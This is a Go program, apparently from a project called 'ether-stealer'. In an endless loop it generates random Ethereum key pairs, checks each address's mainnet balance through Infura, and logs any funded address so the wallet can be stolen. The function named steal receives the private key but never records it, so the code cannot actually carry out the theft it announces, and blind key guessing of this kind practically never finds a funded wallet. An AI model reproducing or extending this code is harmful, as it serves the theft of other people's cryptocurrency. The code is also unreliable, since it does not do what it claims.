package main

import (
	"fmt"

	"github.com/ethereum/go-ethereum/common"
	"github.com/hexoul/ether-stealer/crypto"
	"github.com/hexoul/ether-stealer/json"
	"github.com/hexoul/ether-stealer/log"
)

const (
	httpTimeout   = 10
	urlForBalance = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getBalance?params=[\"%s\",\"latest\"]"
)

func isBalanceGreaterThanZero(addr string) (b bool, val string) {
	url := fmt.Sprintf(urlForBalance, addr)
	ret, err := json.GetRPCResponseFromURL(url)
	if err != nil {
		return
	}

	if val = ret.Result.(string); val != "0x0" {
		b = true
	}
	return
}

func steal(addr common.Address, privkey []byte) {
	canSteal, _ := isBalanceGreaterThanZero(addr.String())
	if canSteal {
		log.Info(addr.String())
	}
}

func main() {
	log.Info("Steal start!!!")
	for {
		pubkey, privkey := crypto.GenerateKeyPair()
		addr := crypto.ToAddressFromPubkey(pubkey)
		go steal(addr, privkey)
	}
}
